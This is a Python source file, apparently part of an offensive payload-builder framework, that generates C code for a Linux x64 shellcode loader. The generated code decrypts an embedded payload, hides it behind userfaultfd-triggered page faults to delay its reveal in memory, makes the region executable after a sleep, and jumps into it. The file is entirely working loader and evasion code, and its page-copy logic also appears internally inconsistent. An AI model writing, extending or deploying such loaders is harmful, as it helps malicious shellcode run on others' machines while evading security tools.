#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""C source generator for userfaultfd-based delayed shellcode reveal (Linux x64)."""

from __future__ import annotations

from lib.compile.linux_injection_common import LinuxInjectionBuilder


class UserfaultfdBuilder(LinuxInjectionBuilder):
    def build_source(self, encoded_payload: str, key: bytes, iv=None) -> str:
        xor_key = (key[0] if key else 0x5A) & 0xFF
        return f"""
{chr(10).join(self.headers())}
#include <pthread.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <linux/userfaultfd.h>

char* enc_payload = "{encoded_payload}";

static unsigned char *g_plain = NULL;
static size_t g_len = 0;
static unsigned char g_xor = 0x{xor_key:02x};
static int g_ufd = -1;

static void *uffd_handler(void *arg)
{{
    struct uffd_msg msg;
    (void)arg;

    for (;;) {{
        ssize_t n = read(g_ufd, &msg, sizeof(msg));
        if (n != (ssize_t)sizeof(msg))
            break;
        if (msg.event != UFFD_EVENT_PAGEFAULT)
            continue;

        unsigned long page = msg.arg.pagefault.address & ~(sysconf(_SC_PAGESIZE) - 1);
        size_t offset = (size_t)(page - (unsigned long)g_plain);
        if (offset >= g_len)
            continue;

        struct uffdio_copy copy;
        memset(&copy, 0, sizeof(copy));
        copy.src = (unsigned long long)(unsigned long)(g_plain + offset);
        copy.dst = (unsigned long long)page;
        copy.len = (unsigned long long)sysconf(_SC_PAGESIZE);
        if (offset + copy.len > g_len)
            copy.len = (unsigned long long)(g_len - offset);
        ioctl(g_ufd, UFFDIO_COPY, &copy);
    }}
    return NULL;
}}

static int setup_userfaultfd(unsigned char *region, size_t len)
{{
    struct uffdio_api api;
    struct uffdio_register reg;
    pthread_t tid;
    size_t page = (size_t)sysconf(_SC_PAGESIZE);
    size_t map_len = (len + page - 1) & ~(page - 1);

    g_plain = region;
    g_len = len;

    g_ufd = (int)syscall(SYS_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    if (g_ufd < 0) return -1;

    api = (struct uffdio_api){{ .api = UFFD_API, .features = 0 }};
    if (ioctl(g_ufd, UFFDIO_API, &api) < 0) return -1;

    reg = (struct uffdio_register){{
        .range = {{ .start = (unsigned long long)(unsigned long)region, .len = map_len }},
        .mode = UFFDIO_REGISTER_MODE_MISSING,
    }};
    if (ioctl(g_ufd, UFFDIO_REGISTER, &reg) < 0) return -1;

    if (pthread_create(&tid, NULL, uffd_handler, NULL) != 0)
        return -1;
    pthread_detach(tid);
    return 0;
}}

int main(void)
{{
    size_t page = (size_t)sysconf(_SC_PAGESIZE);
    size_t map_len;
    unsigned char *fault_region;
{self.decode_preamble()}
{self.decrypt_block(key, iv)}

    map_len = ((size_t)payload_size + page - 1) & ~(page - 1);
    fault_region = (unsigned char *)mmap(
        NULL, map_len, PROT_READ | PROT_WRITE,
        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (fault_region == MAP_FAILED) return 1;

    for (int i = 0; i < payload_size; i++)
        fault_region[i] = shellcode_buf[i] ^ g_xor;

    if (setup_userfaultfd(fault_region, (size_t)payload_size) != 0) {{
        munmap(fault_region, map_len);
        munmap(shellcode_buf, (size_t)payload_size);
        free(decoded);
        return 1;
    }}

    if (madvise(fault_region, map_len, MADV_DONTNEED) != 0) {{
        munmap(fault_region, map_len);
        munmap(shellcode_buf, (size_t)payload_size);
        free(decoded);
        return 1;
    }}

    for (size_t i = 0; i < (size_t)payload_size; i++)
        fault_region[i] ^= g_xor;

    if (mprotect(fault_region, map_len, PROT_READ | PROT_EXEC) != 0) return 1;
    {self.sleep_block()}
    ((void (*)(void))fault_region)();

    munmap(fault_region, map_len);
{self.cleanup_block()}
    return 0;
}}
"""
